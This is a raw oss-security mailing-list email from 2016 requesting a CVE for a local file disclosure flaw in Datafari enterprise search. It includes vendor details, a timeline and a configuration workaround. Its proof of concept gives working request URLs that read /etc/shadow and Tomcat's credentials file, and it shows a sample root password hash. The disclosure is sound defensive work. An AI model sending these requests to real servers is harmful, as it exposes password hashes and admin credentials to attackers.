X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2646" "Wednesday" "3" "February" "2016" "15:55:07" "+0000" "PASCAULT Wilfried" "wpascault@lexsi.com" "<A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFB@SEATTLE.lexsi.lan>" "79" "[oss-security] CVE Request: Datafari Local File Disclosure" "^Date:" nil nil "2" "2016020315:55:07" "[oss-security] CVE Request: Datafari Local File Disclosure" (number mark "U       wpascault@le Feb  3   79/2646  " thread-indent "\"[oss-security] CVE Request: Datafari Local File Disclosure\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26593 invoked by uid 550); 3 Feb 2016 16:27:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9805 invoked from network); 3 Feb 2016 15:55:30 -0000
Thread-Topic: CVE Request: Datafari Local File Disclosure
Thread-Index: AdFem0ELL+SIfg/5Q3eZNZfy0q0XAg==
Message-ID: <A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFB@SEATTLE.lexsi.lan>
Accept-Language: fr-FR, en-US
Content-Language: fr-FR
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-originating-ip: [192.168.12.35]
Content-Type: multipart/alternative;
	boundary="_000_A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFBSEATTLElexsilan_"
MIME-Version: 1.0
Date: Wed, 3 Feb 2016 15:55:07 +0000
From: PASCAULT Wilfried <wpascault@lexsi.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: Datafari Local File Disclosure
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>

--_000_A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFBSEATTLElexsilan_
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

Datafari, an Open source enterprise search software using Apache Solr, Mani=
foldCF and Tomcat is proned to a local file disclosure vulnerability.

Product's information
---------------------
* Name : Datafari - http://www.datafari.com/
* Editor: France Labs
* Affected versions: 2.x<2.1.3
* Tested : 2.1.0 and 2.1.1 on Debian Wheezy 7 and Jesse 8

Description
-----------
When "filesystem" repository has been configured into Datafari (administrat=
ive privileges on Datafari required), a user could access to any file of th=
e system with root privileges.

On "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" configuration f=
ile, "ALLOWLOCALFILEREADING" parameter allows by default to read file on sy=
stem.

Datafari is by default running as user root, so any file could be downloade=
d with "url=3Dfile:/" parameter in "/Datafari/URL" (token isn't checked).

This issue is exploitable only when "Filesystem" repository has been set on=
 ManifoldCF.

Proof of concept
----------------
http://localhost:8080/Datafari/URL?url=3Dfile:/arbitrary_file

http://localhost:8080/Datafari/URL?url=3Dfile:/etc/shadow
=3D> file will be downloaded as _etc_shadow

$ head _etc_shadow
root:$6$nTTh32TT$rLqcSGDf92tyh9aXtuTqnlGW4Ewr.IzBEcdP/kMnvhNYELz7iUgmOyiWes=
bJRUwEeKdKk/2yQcnAVBQYBGsiD.:16714:0:99999:7:::
daemon:*:16714:0:99999:7:::
bin:*:16714:0:99999:7:::
sys:*:16714:0:99999:7:::
sync:*:16714:0:99999:7:::
games:*:16714:0:99999:7:::
man:*:16714:0:99999:7:::
lp:*:16714:0:99999:7:::
mail:*:16714:0:99999:7:::
news:*:16714:0:99999:7:::

another funny file ^_^ (Tomcat manager password could not be changed during=
 installation)
http://localhost:8080/Datafari/URL?url=3Dfile://opt/datafari/tomcat/conf/to=
mcat-users.xml
$ cat _opt_datafari_tomcat_conf_tomcat-users.xml|grep admin
  <user password=3D"@PASSWORD@" roles=3D"manager-gui,SearchAdministrator" u=
sername=3D"admin"/>

http://localhost:8080/manager/html/list


Workaround
----------
Set "ALLOWLOCALFILEREADING=3Dfalse" on "$INSTALLPATH$/datafari/tomcat/conf/=
datafari.properties" and restart Datafari

Timeline
--------
1/6/2016: reported to vendor
1/11/2016: vendor response but said was not a security issue
1/11/2016: add technical details and POC
1/11/2016: vendor acknowledged as a security issue
1/11/2016: patch was commited in master branch
1/28/2016: 2.1.3 released

Thanks to C=E9dric and Aur=E9lien from Datafari project for their quick rep=
lies.

--_000_A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFBSEATTLElexsilan_--
